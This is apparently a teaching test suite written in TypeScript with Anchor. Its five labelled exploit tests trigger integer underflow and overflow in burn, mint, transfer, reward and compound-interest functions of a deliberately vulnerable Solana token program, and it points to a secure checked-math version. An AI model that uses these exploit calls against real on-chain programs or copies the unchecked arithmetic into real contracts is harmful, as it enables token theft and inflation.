import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Keypair, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";

describe("Exploit: Arithmetic Overflow", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.ArithmeticOverflowVulnerable as Program;
  
  let user: Keypair;

  before(async () => {
    user = Keypair.generate();

    const airdrop = await provider.connection.requestAirdrop(
      user.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdrop);
  });

  describe("Exploit 1: Integer Underflow Attack", () => {
    it("Should allow balance underflow through unchecked subtraction", async () => {
      const account = Keypair.generate();

      // Initialize with small balance
      await program.methods
        .initialize(new anchor.BN(100))
        .accounts({
          tokenAccount: account.publicKey,
          owner: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user, account])
        .rpc();

      try {
        // [EXPLOIT] Burn more than balance
        // 100 - 1000 = wraps to huge number in release mode
        await program.methods
          .burn(new anchor.BN(1000))
          .accounts({
            tokenAccount: account.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        const accountData = await program.account.tokenAccount.fetch(account.publicKey);
        
        console.log("ðŸš¨ EXPLOIT 1 SUCCESS: Integer underflow!");
        console.log(`   Started with: 100 tokens`);
        console.log(`   Burned: 1000 tokens`);
        console.log(`   Balance after: ${accountData.balance.toString()}`);
        console.log("   In release mode, this wraps to near u64::MAX!");
      } catch (err) {
        console.log("Note: In debug mode, Rust panics. In release (on-chain), it wraps!");
      }
    });
  });

  describe("Exploit 2: Integer Overflow Attack", () => {
    it("Should allow balance overflow through unchecked addition", async () => {
      const account = Keypair.generate();

      // Initialize near max value
      const nearMax = new anchor.BN("18446744073709551000");  // u64::MAX - 615

      try {
        await program.methods
          .initialize(nearMax)
          .accounts({
            tokenAccount: account.publicKey,
            owner: user.publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([user, account])
          .rpc();

        // [EXPLOIT] Mint causes overflow
        await program.methods
          .mint(new anchor.BN(1000))
          .accounts({
            tokenAccount: account.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        const accountData = await program.account.tokenAccount.fetch(account.publicKey);
        
        console.log("ðŸš¨ EXPLOIT 2 SUCCESS: Integer overflow!");
        console.log(`   Started with: ${nearMax.toString()}`);
        console.log(`   Minted: 1000`);
        console.log(`   Balance after: ${accountData.balance.toString()}`);
        console.log("   Wrapped around instead of increasing!");
      } catch (err) {
        console.log("Note: Overflow behavior differs in debug vs release");
      }
    });
  });

  describe("Exploit 3: Transfer Underflow", () => {
    it("Should allow transfer underflow to create unlimited tokens", async () => {
      const from = Keypair.generate();
      const to = Keypair.generate();

      // Initialize accounts
      await program.methods
        .initialize(new anchor.BN(50))
        .accounts({
          tokenAccount: from.publicKey,
          owner: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user, from])
        .rpc();

      await program.methods
        .initialize(new anchor.BN(0))
        .accounts({
          tokenAccount: to.publicKey,
          owner: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user, to])
        .rpc();

      try {
        // [EXPLOIT] Transfer more than balance
        await program.methods
          .transfer(new anchor.BN(500))
          .accounts({
            from: from.publicKey,
            to: to.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        const fromData = await program.account.tokenAccount.fetch(from.publicKey);
        const toData = await program.account.tokenAccount.fetch(to.publicKey);
        
        console.log("ðŸš¨ EXPLOIT 3 SUCCESS: Transfer underflow!");
        console.log(`   From balance: ${fromData.balance.toString()}`);
        console.log(`   To balance: ${toData.balance.toString()}`);
        console.log("   Sender underflowed to massive balance!");
      } catch (err) {
        console.log("Note: " + err.message);
      }
    });
  });

  describe("Exploit 4: Reward Calculation Overflow", () => {
    it("Should allow reward calculation overflow", async () => {
      const account = Keypair.generate();

      await program.methods
        .initialize(new anchor.BN(1000))
        .accounts({
          tokenAccount: account.publicKey,
          owner: user.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([user, account])
        .rpc();

      try {
        // [EXPLOIT] Large multiplier causes overflow
        const hugePrincipal = new anchor.BN("10000000000000");
        const hugeMultiplier = new anchor.BN("10000000000000");
        
        await program.methods
          .calculateReward(hugePrincipal, hugeMultiplier, new anchor.BN(100))
          .accounts({
            rewardAccount: account.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        const accountData = await program.account.tokenAccount.fetch(account.publicKey);
        
        console.log("ðŸš¨ EXPLOIT 4 SUCCESS: Calculation overflow!");
        console.log(`   Reward calculation overflowed`);
        console.log(`   Balance: ${accountData.balance.toString()}`);
      } catch (err) {
        console.log("Note: Multiplication overflow");
      }
    });
  });

  describe("Exploit 5: Compound Interest Overflow", () => {
    it("Should allow compound calculation overflow", async () => {
      const account = Keypair.generate();

      const largeBalance = new anchor.BN("1000000000000000");

      try {
        await program.methods
          .initialize(largeBalance)
          .accounts({
            tokenAccount: account.publicKey,
            owner: user.publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([user, account])
          .rpc();

        // [EXPLOIT] High rate and many periods cause overflow
        await program.methods
          .compoundInterest(
            new anchor.BN(100),  // 100 periods
            new anchor.BN(5000)  // 50% per period (huge!)
          )
          .accounts({
            account: account.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        const accountData = await program.account.tokenAccount.fetch(account.publicKey);
        
        console.log("ðŸš¨ EXPLOIT 5 SUCCESS: Compound overflow!");
        console.log(`   Final balance: ${accountData.balance.toString()}`);
      } catch (err) {
        console.log("Note: Compound overflow error");
      }
    });
  });

  describe("Summary", () => {
    it("Should summarize all overflow exploits", () => {
      console.log("\n========================================");
      console.log("ARITHMETIC VULNERABILITY SUMMARY");
      console.log("========================================");
      console.log("[EXPLOIT] 1: Integer underflow (burn > balance)");
      console.log("[EXPLOIT] 2: Integer overflow (mint near MAX)");
      console.log("[EXPLOIT] 3: Transfer underflow");
      console.log("[EXPLOIT] 4: Reward calculation overflow");
      console.log("[EXPLOIT] 5: Compound interest overflow");
      console.log("========================================");
      console.log("\nAll exploits use unchecked arithmetic.");
      console.log("Real-world impact: $7.5M+ (BurgerSwap, Mochi Market)");
      console.log("See secure implementation for checked math.");
    });
  });
});